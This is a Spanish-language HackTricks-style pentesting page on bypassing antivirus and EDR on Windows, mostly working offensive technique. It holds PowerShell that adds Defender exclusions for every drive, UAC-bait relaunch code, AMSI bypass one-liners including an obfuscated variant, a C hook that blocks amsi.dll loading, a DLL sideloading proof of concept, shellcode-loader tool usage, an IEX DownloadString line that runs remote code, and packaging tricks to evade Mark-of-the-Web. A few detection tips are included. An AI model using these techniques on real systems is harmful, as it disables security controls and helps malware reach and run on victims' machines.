# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**¡Esta página fue escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para impedir que Windows Defender funcione.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para detener Windows Defender haciéndose pasar por otro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Cebo de UAC estilo instalador antes de manipular Defender

Los loaders públicos que se hacen pasar por game cheats suelen distribuirse como instaladores sin firmar de Node.js/Nexe que primero **piden elevación al usuario** y solo entonces neutralizan a Defender. El flujo es simple:

1. Verifica el contexto administrativo con `net session`. El comando solo tiene éxito cuando el llamador posee privilegios de administrador, por lo que un fallo indica que el loader se está ejecutando como un usuario estándar.
2. Se relanza inmediatamente a sí mismo con el verbo `RunAs` para provocar el esperado aviso de consentimiento de UAC mientras conserva la línea de comandos original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Las víctimas ya creen que están instalando “cracked” software, por lo que normalmente aceptan el aviso, otorgando al malware los derechos que necesita para cambiar la política de Defender.

### Exclusiones generales `MpPreference` para cada letra de unidad

Una vez elevados, GachiLoader-style chains maximizan los puntos ciegos de Defender en lugar de deshabilitar el servicio por completo. El loader primero mata al GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) y luego aplica **exclusiones extremadamente amplias** para que cada perfil de usuario, directorio del sistema y disco extraíble se vuelvan imposibles de escanear:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observaciones clave:

- El bucle recorre todos los sistemas de archivos montados (D:\, E:\, pendrives USB, etc.), por lo que **cualquier payload futuro dejado en cualquier parte del disco es ignorado**.
- La exclusión para la extensión `.sys` es prospectiva: los atacantes se reservan la opción de cargar controladores no firmados más tarde sin volver a modificar Defender.
- Todos los cambios se almacenan bajo `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, lo que permite a etapas posteriores confirmar que las exclusiones persisten o ampliarlas sin volver a desencadenar UAC.

Como no se detiene ningún servicio de Defender, las comprobaciones básicas de estado siguen informando “antivirus activo” aunque la inspección en tiempo real nunca toque esas rutas.

## **AV Evasion Methodology**

Actualmente, los AVs utilizan diferentes métodos para determinar si un archivo es malicioso: static detection, dynamic analysis y, en los EDRs más avanzados, behavioural analysis.

### **Static detection**

Static detection se logra marcando cadenas conocidas maliciosas o arreglos de bytes en un binario o script, y también extrayendo información del propio archivo (p. ej. file description, company name, digital signatures, icon, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede atraparte más fácilmente, ya que probablemente ya han sido analizadas y marcadas como maliciosas. Hay un par de maneras de evitar este tipo de detección:

- **Encryption**

Si cifras el binario, no habrá forma de que el AV detecte tu programa, pero necesitarás algún tipo de loader para descifrarlo y ejecutar el programa en memoria.

- **Obfuscation**

A veces lo único que necesitas es cambiar algunas cadenas en tu binario o script para pasar el AV, pero esto puede ser una tarea que consuma tiempo dependiendo de lo que intentes ofuscar.

- **Custom tooling**

Si desarrollas tus propias herramientas, no habrá firmas conocidas malas, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> Una buena forma de comprobar la static detection de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente divide el archivo en múltiples segmentos y luego ordena a Defender que escanee cada uno individualmente; de esta forma puede decirte exactamente qué cadenas o bytes están marcados en tu binario.

Te recomiendo encarecidamente consultar esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion práctica.

### **Dynamic analysis**

Dynamic analysis es cuando el AV ejecuta tu binario en una sandbox y vigila actividad maliciosa (p. ej. intentar descifrar y leer las contraseñas del navegador, realizar un minidump de LSASS, etc.). Esta parte puede ser un poco más complicada, pero aquí hay algunas cosas que puedes hacer para evadir sandboxes.

- **Sleep before execution** Dependiendo de cómo esté implementado, puede ser una gran forma de bypassear el dynamic analysis del AV. Los AVs tienen un tiempo muy corto para escanear archivos para no interrumpir el flujo de trabajo del usuario, por lo que usar sleeps largos puede perturbar el análisis de binarios. El problema es que muchas sandboxes del AV pueden simplemente saltarse el sleep dependiendo de cómo se haya implementado.
- **Checking machine's resources** Normalmente las Sandboxes tienen muy pocos recursos para trabajar (p. ej. < 2GB RAM), de lo contrario podrían ralentizar la máquina del usuario. También puedes ser creativo aquí, por ejemplo comprobando la temperatura de la CPU o incluso las velocidades del ventilador; no todo estará implementado en la sandbox.
- **Machine-specific checks** Si quieres dirigirte a un usuario cuya estación está unida al dominio "contoso.local", puedes comprobar el dominio del equipo para ver si coincide con el que has especificado; si no coincide, puedes hacer que tu programa salga.

Resulta que el computername de la Sandbox de Microsoft Defender es HAL9TH, así que puedes comprobar el nombre del equipo en tu malware antes de la detonación; si el nombre coincide con HAL9TH, significa que estás dentro de la sandbox de Defender, por lo que puedes hacer que tu programa termine.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algunos otros muy buenos consejos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a las Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como hemos dicho antes en este post, **las herramientas públicas** eventualmente **serán detectadas**, así que deberías preguntarte algo:

Por ejemplo, si quieres dump LSASS, **¿realmente necesitas usar mimikatz**? ¿O podrías usar otro proyecto menos conocido que también haga dump de LSASS?

La respuesta correcta probablemente sea la última. Tomando mimikatz como ejemplo, probablemente sea una de las piezas más, si no la más, marcadas por AVs y EDRs; aunque el proyecto en sí es muy bueno, también es una pesadilla para evitar a los AVs, así que busca alternativas para lo que intentas lograr.

> [!TIP]
> Cuando modifiques tus payloads para evasión, asegúrate de **desactivar el envío automático de muestras** en Defender y, por favor, en serio, **NO SUBAS A VIRUSTOTAL** si tu objetivo es lograr evasión a largo plazo. Si quieres comprobar si tu payload es detectado por un AV en particular, instálalo en una VM, intenta desactivar el envío automático de muestras y pruébalo allí hasta que estés satisfecho con el resultado.

## EXEs vs DLLs

Siempre que sea posible, **prioriza usar DLLs para evasión**; en mi experiencia, los archivos DLL suelen estar **mucho menos detectados** y analizados, así que es un truco muy sencillo para evitar detección en algunos casos (si tu payload tiene alguna forma de ejecutarse como DLL, por supuesto).

Como podemos ver en esta imagen, un DLL Payload de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el EXE payload tiene una tasa de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparación en antiscan.me de un Havoc EXE payload normal frente a un Havoc DLL normal</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## DLL Sideloading & Proxying

**DLL Sideloading** aprovecha el orden de búsqueda de DLL usado por el loader posicionando tanto la aplicación víctima como el/los payload(s) malicioso(s) lado a lado.

Puedes buscar programas susceptibles a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) y el siguiente powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Recomiendo encarecidamente que **explore DLL Hijackable/Sideloadable programs yourself**, esta técnica es bastante sigilosa si se hace correctamente, pero si usa programas DLL Sideloadable conocidos públicamente, puede ser detectado fácilmente.

Simplemente colocar una DLL maliciosa con el nombre que un programa espera cargar no hará que cargue su payload, ya que el programa espera funciones específicas dentro de esa DLL; para solucionar este problema, usaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía las llamadas que hace un programa desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y permitiendo manejar la ejecución de su payload.

I will be using the [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una plantilla de código fuente DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estos son los resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como el proxy DLL tienen una Detection rate de 0/26 en [antiscan.me](https://antiscan.me)! Lo consideraría un éxito.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Te **recomiendo encarecidamente** ver [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender más sobre lo que hemos discutido en mayor profundidad.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` no es una KnownDLL, por lo que se resuelve mediante el orden de búsqueda normal.

PoC (copy-paste):
1) Copia la DLL del sistema firmada en una carpeta escribible
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca un `NCRYPTPROV.dll` malicioso en la misma carpeta. Un DllMain mínimo es suficiente para obtener ejecución de código; no necesitas implementar la función reenviada para activar DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Activar el reenvío con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- While resolving `KeyIsoSetAuditingInterface`, the loader follows the forward to `NCRYPTPROV.SetAuditingInterface`
- The loader then loads `NCRYPTPROV.dll` from `C:\test` and executes its `DllMain`
- If `SetAuditingInterface` is not implemented, you'll get a "missing API" error only after `DllMain` has already run

Consejos de detección:
- Céntrate en forwarded exports donde el módulo objetivo no es un KnownDLL. KnownDLLs están listados en `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puedes enumerar forwarded exports con herramientas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt

Ideas de detección/defensa:
- Monitorizar LOLBins (p. ej., rundll32.exe) cargando DLLs firmadas desde rutas no del sistema, seguido de la carga de non-KnownDLLs con el mismo nombre base desde ese directorio
- Alertar sobre cadenas proceso/módulo como: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` bajo rutas escribibles por el usuario
- Aplicar políticas de integridad de código (WDAC/AppLocker) y denegar write+execute en directorios de aplicación

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puedes usar Freeze para cargar y ejecutar tu shellcode de forma sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es solo un juego de gato y ratón; lo que funciona hoy puede detectarse mañana, así que nunca confíes en una sola herramienta. Si es posible, intenta encadenar múltiples técnicas de evasión.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs a menudo colocan **user-mode inline hooks** en los stubs de syscall de `ntdll.dll`. Para eludir esos hooks, puedes generar stubs de syscall **directos** o **indirectos** que carguen el **SSN** (Número de Servicio del Sistema) correcto y hagan la transición a modo kernel sin ejecutar el entrypoint exportado hooked.

**Opciones de invocación:**
- **Direct (embedded)**: emitir una instrucción `syscall`/`sysenter`/`SVC #0` en el stub generado (sin tocar la exportación de `ntdll`).
- **Indirect**: saltar a un gadget de `syscall` existente dentro de `ntdll` para que la transición al kernel parezca originarse desde `ntdll` (útil para evasión heurística); **randomized indirect** elige un gadget de una pool por llamada.
- **Egg-hunt**: evitar incrustar la secuencia de opcodes estática `0F 05` en disco; resolver una secuencia de syscall en tiempo de ejecución.

**Estrategias de resolución de SSN resistentes a hooks:**
- **FreshyCalls (VA sort)**: inferir SSNs ordenando los stubs de syscall por dirección virtual en lugar de leer los bytes del stub.
- **SyscallsFromDisk**: mapear un `\KnownDlls\ntdll.dll` limpio, leer los SSN desde su sección `.text`, y luego unmapear (evita todos los hooks en memoria).
- **RecycledGate**: combinar la inferencia de SSN ordenada por VA con validación de opcodes cuando un stub está limpio; recurrir a la inferencia por VA si está hooked.
- **HW Breakpoint**: establecer DR0 sobre la instrucción `syscall` y usar un VEH para capturar el SSN desde `EAX` en tiempo de ejecución, sin parsear bytes hookeados.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI fue creado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AVs solo podían escanear **files on disk**, así que si de alguna manera podías ejecutar payloads **directly in-memory**, el AV no podía hacer nada para evitarlo, ya que no tenía suficiente visibilidad.

La funcionalidad AMSI está integrada en estos componentes de Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Permite a las soluciones antivirus inspeccionar el comportamiento de scripts exponiendo el contenido del script en una forma que sea tanto sin cifrar como no ofuscada.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

No dejamos ningún archivo en disco, pero aun así fuimos detectados in-memory debido a AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Dado que AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

- **AMSI Bypass**

Dado que AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularla fácilmente incluso ejecutando como un usuario no privilegiado. Debido a este fallo en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el escaneo de AMSI.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a firma para evitar su uso generalizado.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bastó una línea de código de powershell para dejar AMSI inutilizable para el proceso de powershell actual. Esa línea, por supuesto, ha sido marcada por AMSI, por lo que se necesita alguna modificación para poder usar esta técnica.

Aquí hay un AMSI bypass modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Ten en cuenta que esto probablemente será marcado una vez que se publique este post, por lo que no deberías publicar ningún código si tu intención es no ser detectado.

**Memory Patching**

Esta técnica fue descubierta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) y consiste en encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada proporcionada por el usuario) y sobrescribirla con instrucciones para devolver el código E_INVALIDARG; de esta manera, el resultado del escaneo real devolverá 0, lo que se interpreta como un resultado limpio.

> [!TIP]
> Por favor lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.

También existen muchas otras técnicas para bypass AMSI con powershell; consulta [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) y [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender más sobre ellas.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI se inicializa solo después de que `amsi.dll` se carga en el proceso actual. Un bypass robusto e independiente del lenguaje consiste en colocar un user‑mode hook en `ntdll!LdrLoadDll` que devuelva un error cuando el módulo solicitado sea `amsi.dll`. Como resultado, AMSI nunca se carga y no se realizan escaneos en ese proceso.

Esquema de implementación (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona en PowerShell, WScript/CScript y custom loaders por igual (cualquier cosa que de otra manera cargaría AMSI).
- Combínalo con pasar scripts por stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefactos largos en la línea de comandos.
- Visto usado por loaders ejecutados a través de LOLBins (p. ej., `regsvr32` llamando a `DllRegisterServer`).

La herramienta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** también genera scripts para evadir AMSI.
La herramienta **[https://amsibypass.com/](https://amsibypass.com/)** también genera scripts para evadir AMSI que evitan firmas mediante funciones definidas por el usuario aleatorizadas, variables, expresiones de caracteres y aplica cambios aleatorios de mayúsculas/minúsculas a las palabras clave de PowerShell para evitar firmas.

**Eliminar la firma detectada**

Puedes usar una herramienta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la firma AMSI detectada de la memoria del proceso actual. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la firma AMSI y luego sobrescribiéndola con instrucciones NOP, eliminándola efectivamente de la memoria.

**Productos AV/EDR que usan AMSI**

Puedes encontrar una lista de productos AV/EDR que usan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usa PowerShell versión 2**
Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin ser escaneados por AMSI. Puedes hacer esto:
```bash
powershell.exe -version 2
```
## Registro PS

El registro de PowerShell es una característica que permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para auditoría y resolución de problemas, pero también puede ser un **problema para los atacantes que quieren evadir la detección**.

Para eludir el registro de PowerShell, puedes usar las siguientes técnicas:

- **Desactivar PowerShell Transcription y Module Logging**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Usar PowerShell versión 2**: Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin que AMSI los escanee. Puedes hacerlo: `powershell.exe -version 2`
- **Usar una sesión de PowerShell no gestionada**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para generar una sesión de powershell sin defensas (esto es lo que `powerpick` de Cobal Strike usa).


## Ofuscación

> [!TIP]
> Varias técnicas de ofuscación se basan en cifrar datos, lo que aumenta la entropía del binario y facilita que los AV y EDR lo detecten. Ten cuidado con esto y quizá aplica el cifrado solo a secciones específicas de tu código que sean sensibles o necesiten ocultarse.

### Desofuscando binarios .NET protegidos por ConfuserEx

Al analizar malware que usa ConfuserEx 2 (o forks comerciales) es común enfrentarse a varias capas de protección que bloquearán los decompiladores y sandboxes. El flujo de trabajo siguiente restaura de forma fiable un IL casi original que luego puede ser decompilado a C# en herramientas como dnSpy o ILSpy.

1.  Eliminación de anti-tamper – ConfuserEx cifra cada *method body* y lo descifra dentro del constructor estático del *module* (`<Module>.cctor`). Esto también parchea el checksum del PE, por lo que cualquier modificación hará que el binario se bloquee. Usa **AntiTamperKiller** para localizar las tablas de metadata cifradas, recuperar las claves XOR y reescribir un ensamblado limpio:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La salida contiene los 6 parámetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que pueden ser útiles al construir tu propio unpacker.

2.  Recuperación de símbolos / flujo de control – alimenta el archivo *clean* a **de4dot-cex** (un fork de de4dot compatible con ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – selecciona el perfil de ConfuserEx 2
• de4dot deshará el aplanamiento del flujo de control, restaurará los espacios de nombres, clases y nombres de variables originales y descifrará las cadenas constantes.

3.  Eliminación de proxy-calls – ConfuserEx reemplaza llamadas de método directas con wrappers ligeros (a.k.a *proxy calls*) para complicar aún más la decompilación. Elimínalos con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Después de este paso deberías observar API normales de .NET como `Convert.FromBase64String` o `AES.Create()` en lugar de funciones wrapper opacas (`Class8.smethod_10`, …).

4.  Limpieza manual – ejecuta el binario resultante en dnSpy, busca grandes blobs Base64 o el uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar la carga útil *real*. A menudo el malware la almacena como un array de bytes codificado en TLV inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin** necesitar ejecutar la muestra maliciosa — útil cuando trabajas en una estación de trabajo sin conexión.

> 🛈  ConfuserEx produce un atributo personalizado llamado `ConfusedByAttribute` que puede usarse como IOC para triage automático de muestras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de ofrecer mayor seguridad del software mediante [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de obfuscated operations generadas por el C++ template metaprogramming framework que hará la vida de la persona que quiera crack the application un poco más difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un x64 binary obfuscator que es capaz de obfuscate varios archivos PE diferentes incluyendo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un simple metamorphic code engine para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is a fine-grained code obfuscation framework for LLVM-supported languages using ROP (return-oriented programming). ROPfuscator obfuscates a program at the assembly code level by transforming regular instructions into ROP chains, thwarting our natural conception of normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

Puede que hayas visto esta pantalla al descargar algunos ejecutables de internet y ejecutarlos.

Microsoft Defender SmartScreen es un mecanismo de seguridad destinado a proteger al usuario final contra la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente con un enfoque basado en reputación, lo que significa que las aplicaciones que no se descargan con frecuencia activarán SmartScreen, alertando y evitando que el usuario final ejecute el archivo (aunque el archivo aún puede ejecutarse haciendo clic en More Info -> Run anyway).

**MoTW** (Mark of The Web) es un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con el nombre de Zone.Identifier que se crea automáticamente al descargar archivos desde internet, junto con la URL desde la que se descargó.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobando el Zone.Identifier ADS de un archivo descargado desde internet.</p></figcaption></figure>

> [!TIP]
> Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **trusted** **won't trigger SmartScreen**.

Una forma muy efectiva de evitar que tus payloads obtengan el Mark of The Web es empaquetándolos dentro de algún tipo de contenedor como una ISO. Esto ocurre porque Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta payloads en contenedores de salida para evadir Mark-of-the-Web.

Ejemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
